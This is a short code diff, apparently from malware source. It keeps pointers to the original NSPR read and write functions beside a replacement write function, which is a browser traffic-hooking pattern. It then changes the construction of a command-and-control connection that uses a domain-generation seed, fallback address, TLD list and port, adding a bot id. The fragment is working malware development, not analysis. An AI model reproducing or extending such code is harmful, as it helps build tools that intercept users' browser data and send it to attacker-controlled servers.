@@ -10,7 +10,7 @@
 
 pr_io_func pr_write_orig = 0;
 pr_io_func pr_read_orig = 0;
-C2 c2connection{ conf::dgaseed,conf::fallbackaddr,conf::tlds,conf::port};
+C2 c2connection{ conf::dgaseed,conf::fallbackaddr,conf::tlds,conf::port,conf::id};
 
 
 int myPR_WRITE(void* fd, void* buf, int amnt) {
